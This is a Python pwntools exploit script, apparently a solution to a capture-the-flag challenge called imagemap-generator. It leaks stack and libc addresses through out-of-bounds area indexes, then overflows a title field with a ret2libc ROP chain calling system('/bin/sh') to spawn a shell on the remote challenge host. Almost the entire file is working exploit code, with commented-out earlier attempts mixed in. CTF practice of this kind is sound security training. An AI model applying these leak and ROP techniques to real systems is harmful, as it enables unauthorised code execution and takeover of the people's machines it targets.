#!/usr/bin/env python3

from pwn import *

exe = ELF("./generator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

# context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # if args.DEBUG:
        # gdb.attach(r, gdbscript="break *edit_area")
        gdb.attach(r)
    else:
        r = remote("imagemap-generator.challs.sekai.team", 1337)

    return r

def create_area(r, x, y, width, height, url, title):
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'x coordinate: ', str(x).encode())
    r.sendlineafter(b'y coordinate: ', str(y).encode())
    r.sendlineafter(b'width: ', str(width).encode())
    r.sendlineafter(b'height: ', str(height).encode())
    r.sendlineafter(b'redirect URL: ', url)
    r.sendlineafter(b'title: ', title)


def edit_area(r, idx: bytes,  X: bytes, Y: bytes, width: bytes, height: bytes, redirect: bytes, title: bytes):
    r.sendline(b"3") # edit area
    r.sendline(idx) # areas + 3*0x220

    r.sendline(X) # X
    r.sendline(Y) # y
    r.sendline(width) # width
    r.sendline(height) # height
    r.sendline(redirect) # redirect
    r.sendline(title) # generate imagemap

def edit_area_2(r, area_num):
    """Edit an area and capture the leaked 'current' values"""
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'): ', str(area_num).encode())
    
    # Capture the leaked x coordinate
    r.recvuntil(b'(current: ')
    x_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(x_leak).encode())
    
    # Capture the leaked y coordinate  
    r.recvuntil(b'(current: ')
    y_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(y_leak).encode())
    
    # Capture the leaked width
    r.recvuntil(b'(current: ')
    width_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(width_leak).encode())
    
    # Capture the leaked height
    r.recvuntil(b'(current: ')
    height_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(height_leak).encode())
    
    # URL and title
    r.recvuntil(b'(current: ')
    r.sendline(b'dummy')
    
    r.recvuntil(b'(current: ')
    r.sendline(b'dummy')
    values = [x_leak, y_leak, width_leak, height_leak]
    # values = [i for i in values]
    # print(values)
    return values


def main():
    r = conn()

    r.sendline(b"X" * 512) # image url

    # stack leak
    r.sendline(b"1") # create area
    r.sendline(f"A".encode()) # glitch
    r.sendline(f"A".encode()) # 
    r.sendline(b"4") # generate imagemap

    stack_leak = r.recvuntil("[/imagemap]").splitlines()[-2].split()[0].decode()
    print("stack_leak:", stack_leak)
    stack_leak = int(stack_leak)
    print("stack_leak (converted):", stack_leak)
    print("stack_leak (hex):", hex(stack_leak))
    
    main_rbp = stack_leak

    got_strcpy = exe.got["strcpy"]

    # top of stack (HI)
    saved_rip = main_rbp + 8 #RIP_width = 8
    # ---- main rbp
    image_url = main_rbp - 1024 #char[1024]
    areas = image_url - 0x220 * 16 #AREA[16]
    num_areas = areas - 4 #int
    sel = num_areas - 4 #int

    # this is true for some reason
    rsp = sel-8
    # ------ bottom of stack (LOW)

    # import math
    # delta = areas-got_strcpy
    # print(f"delta: {delta} cong {delta%0x220} mod 544 | log_2(delta) = {math.log2(delta)}")
    # print(f"amounts: {delta//0x220}")

    # print("areas:", hex(areas))
    # print("rdi should be at:", hex(areas))

    # payload = p64(0x401add)
    # payload = p64(0x401c5d)

    # RBP_1 = p64(areas)
    # RIP_1 = p64(0x401915)
    # edit_area(r,
    #     idx=b"18",
    #     X=b"1",
    #     Y=b"1",
    #     width=b"1",
    #     height=b"1",
    #     redirect=b"C",
    #     title=
    #     cyclic(92+100) + RBP_1 + RIP_1
    #     )

    create_area(r, p64(exe.got['puts']), 0, 0, 0, b"0", b"0",)

    leaks = edit_area_2(r,-3)

    leaked = int(leaks[3])
    print("leaked:", hex(leaked))

    libc_addr = int(leaks[3]) - 0x21aaa0
    libc.address = libc_addr
    print("CALCUALTED LIBC:", hex(libc_addr))


    # Method 1: Use pwntools ROP
    libc_rop = ROP(libc)

    # Get gadgets
    pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = libc_rop.find_gadget(['ret'])[0]

    log.info(f"pop rdi (libc): {hex(pop_rdi)}")
    log.info(f"ret (libc): {hex(ret)}")

    # Get symbols
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh\x00'))

    log.info(f"system: {hex(system)}")
    log.info(f"/bin/sh: {hex(binsh)}")

    # ========== STAGE 2: ROP Chain with ONLY libc ==========

    payload2 = flat([
        ret, 
        ret,        # Stack alignment (from libc)
        pop_rdi,    # From libc
        binsh,      # From libc
        system      # From libc
    ])

    print(payload2)

    edit_area(r,
        idx=b"18",
        X=b"1",
        Y=b"1",
        width=b"1",
        height=b"1",
        redirect=b"C",
        title=
        cyclic(92+100) + payload2
        )

    # rdi_payload = b"ABCDEFGHIJKL"
    # edit_area(r,
    #     b"-2",
    #     b"1",
    #     b"1",
    #     b"1",
    #     b"1",
    #     b"E"*254,
    #     b"F"*254,
    #     )

    # r.sendline(b"3") # edit area
    # r.sendline(f"-3".encode()) # areas + 3*0x220

    # # rdi-(areas-3*0xx20)  = 272
    # r.sendline(f"1".encode()) # X
    # r.sendline(f"1".encode()) # y
    # r.sendline(f"1".encode()) # width
    # r.sendline(f"1".encode()) # height
    # # 272-32 = 240
    # r.sendline(b"C" * 240 + rdi_payload) # generate imagemap
    # r.sendline(b"hello world") # generate imagemap


    # r.sendline(b"3") # edit area
    # r.sendline(f"18".encode()) # areas - 18*0x220
    # # 1024 - 0x220 = 480
    # r.sendline(f"1".encode()) # X
    # r.sendline(f"1".encode()) # y
    # r.sendline(f"1".encode()) # width
    # r.sendline(f"1".encode()) # height
    # r.sendline(b"C") # generate imagemap

    # goal: write 0x405020 to rdi pointed

    # r.sendline(b"5") # exit main to jmp to overwritten saved rip

    r.interactive()


if __name__ == "__main__":
    main()
